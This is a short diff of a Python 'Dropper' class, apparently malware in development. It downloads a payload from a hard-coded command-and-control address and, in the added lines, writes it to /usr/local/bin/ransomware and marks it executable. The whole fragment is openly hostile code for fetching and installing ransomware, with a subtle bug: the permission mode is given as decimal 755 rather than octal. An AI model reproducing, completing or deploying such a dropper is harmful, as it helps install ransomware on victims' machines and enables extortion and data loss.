@@ -1,4 +1,5 @@
 import requests
+import os
 
 class Dropper():
     CNC_ADDRESS="http://172.19.0.2:6666/"
@@ -8,7 +9,12 @@ class Dropper():
         resp = requests.get(url)
         malware = resp.content
 
-        with open("/root/")
+        path = "/usr/local/bin/ransomware"
+        with open(path, "wb") as f:
+            f.write(malware)
+
+        os.chmod(path, 755)
+
 
 
 if __name__=="__main__":
